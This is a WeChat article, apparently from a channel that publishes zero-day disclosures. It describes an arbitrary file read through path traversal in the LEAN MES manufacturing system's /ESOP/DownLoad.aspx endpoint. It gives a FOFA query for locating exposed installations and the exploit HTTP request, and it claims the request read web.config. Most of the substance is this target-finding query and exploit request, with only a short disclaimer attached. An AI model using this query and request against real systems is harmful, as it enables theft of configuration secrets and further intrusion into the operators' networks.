---
title: 【0day】深科特 LEAN MES系统 DownLoad.aspx 任意文件读取漏洞
url: https://mp.weixin.qq.com/s/Pyp_x6-3-P47tCkSCyJl_Q
source: Doonsec's feed
date: 2026-03-26
fetch_date: 2026-03-27T04:28:16.271871
---

# 【0day】深科特 LEAN MES系统 DownLoad.aspx 任意文件读取漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZrTsB3aQgWBm9w7shF9Rt83lKF3NqxPW7q4TUaGbSib6P2cqAMCQicSicRt5YFLicSQIm9fKicNyjBkguHAZyKiauxARic1avtePicPIzLjclQ3XzRk/0?wx_fmt=jpeg)

# 【0day】深科特 LEAN MES系统 DownLoad.aspx 任意文件读取漏洞

0day收割机

![]()

在小说阅读器中沉浸阅读

# 漏洞简介

LEAN MES系统是由深圳市深科特信息技术有限公司开发的一款应用系统，主要用于生产调度、产品跟踪、质量控制等车间管理功能。LEAN MES精益制造执行系统通过强调制造过程的信息化和透明化，帮助企业由粗放式向精益化管理模式升级。该系统 /ESOP/DownLoad.aspx 存在任意文件读取漏洞。攻击者可通过构造恶意请求，利用路径遍历（目录穿越）漏洞，实现任意文件读取，影响范围包括系统数据访问权限，可能导致敏感信息泄露，为后续攻击提供便利。

# 影响版本

# fofa语法

> (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant\_top.png"

# 漏洞复现

```
GET /ESOP/DownLoad.aspx?fileName=file_to_read&Action=PLM HTTP/1.1
Host:
```

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWCAlcXuO64Tp0tSmRA3ibo78ryFV6wWQvw2Ulh28f1icKPQfI2VYrbbMkdsjAiacx7ic7RVtwTkTfnccia5Cl8oP3Mzwrp5xKsVelJU/640?wx_fmt=png&from=appmsg)

成功读取到了web.config配置文件

仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

0day收割机

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过